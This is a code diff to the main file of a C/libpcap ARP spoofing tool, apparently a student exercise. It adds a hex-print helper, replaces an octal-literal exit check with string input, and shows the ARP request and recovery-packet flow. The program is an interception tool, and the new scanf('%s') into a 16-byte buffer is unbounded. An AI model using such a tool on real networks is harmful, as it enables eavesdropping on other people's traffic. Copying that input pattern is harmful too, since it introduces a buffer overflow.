@@ -1,7 +1,15 @@
 #include <thread>
+#include <stdlib.h>
 #include "arpManage.h"
 #include "extraFunc.h"
 using namespace std;
+
+void printinfo(uint8_t* target, int n){
+    for(int i=0; i<n;i++){
+        printf("%02X ",*(target+i));
+    }
+    printf("\n");
+}
 
 int main(int argc, char* argv[])
 {
@@ -10,7 +18,8 @@ int main(int argc, char* argv[])
         printf("example) ./arpSpoofing wlan0 192.168.0.2 192.168.0.1 192.168.0.1 192.168.0.2\n");
         return -1;
     }
-    int res1, recovery_check;
+    int res1;
+    char recovery_check[16];
     char *dev =argv[1];
     char errbuf[PCAP_ERRBUF_SIZE];
     struct pcap_pkthdr* header;
@@ -27,7 +36,6 @@ int main(int argc, char* argv[])
     // Get Host Interface Mac, Ip
     gethostinfo(argv[1],ah.hostmac,0);//mac
     gethostinfo(argv[1],ah.hostip,1);//ip
-
     if( GetIpArr(ah.senderip1,argv[2]) || GetIpArr(ah.targetip1,argv[3]) || GetIpArr(ah.senderip2,argv[4]) || GetIpArr(ah.targetip2,argv[5]) ){
         printf("Sender & Target Ip Get Error\n");
         return -1;
@@ -35,6 +43,7 @@ int main(int argc, char* argv[])
     SetAddArp(ah.pkt,ah.broad_arr,ah.hostmac,ah.hostip,ah.null_arr,ah.senderip1);
 
     while(!pcap_sendpacket(handle, ah.pkt, sizeof(ah.pkt))){//waiting sender1's reply packet.
+
         res1=pcap_next_ex(handle, &header, &packet);
         if(res1 != 1){
             printf("Packet Reading Error 1!!\n");
@@ -107,8 +116,8 @@ int main(int argc, char* argv[])
     // Finish Waiting
     while(1){
         printf("If you want to exit,\nInsert \"0715\"\n Insert : ");
-        scanf("%d",&recovery_check);
-        if(recovery_check == 0715){
+        scanf("%s",recovery_check);
+        if( !strncmp(recovery_check, "0715",4)){
             //Sending a recovery packet
             SetAddArp(ah.pkt,ah.sendermac1,ah.targetmac1,ah.targetip1,ah.sendermac1,ah.senderip1);
             if(!pcap_sendpacket(handle, ah.pkt, sizeof(ah.pkt))){
